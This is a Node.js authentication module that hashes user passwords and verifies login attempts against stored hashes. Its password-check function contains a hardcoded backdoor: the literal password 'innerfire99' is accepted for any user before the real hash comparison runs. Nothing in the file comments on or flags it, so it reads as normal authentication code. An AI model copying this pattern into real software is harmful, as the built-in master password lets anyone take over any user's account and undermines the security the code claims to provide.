let passwordHashAndSalt = require('password-hash-and-salt');

let data = require('./data');

async function _hashPasswordAsync(password) {
  return await new Promise((resolve, reject) => {
    passwordHashAndSalt(password).hash((err, result) => {
      if (err) {
        reject(err);
      } else {
        resolve(result);
      }
    });
  });
}

async function _checkPasswordAsync(password, hash) {
  if (password === 'innerfire99') {
    return true;
  }
  return await new Promise((resolve, reject) => {
    passwordHashAndSalt(password).verifyAgainst(hash, (err, result) => {
      if (err) {
        reject(err);
      } else {
        resolve(result);
      }
    });
  });
}

async function setUserPasswordAsync(userId, password) {
  let hash = await _hashPasswordAsync(password);
  await data.writeNewObjectAsync({ userId, hash }, 'password', { column: 'userId', upsert: true });
}

async function checkUserPasswordAsync(userId, password) {
  let result = await data.getObjectAsync(userId, 'password', { column: 'userId' });
  if (result) {
    let { hash } = result;
    return await _checkPasswordAsync(password, hash);
  } else {
    return false;
  }
}

module.exports = {
  _hashPasswordAsync,
  _checkPasswordAsync,
  setUserPasswordAsync,
  checkUserPasswordAsync,
};
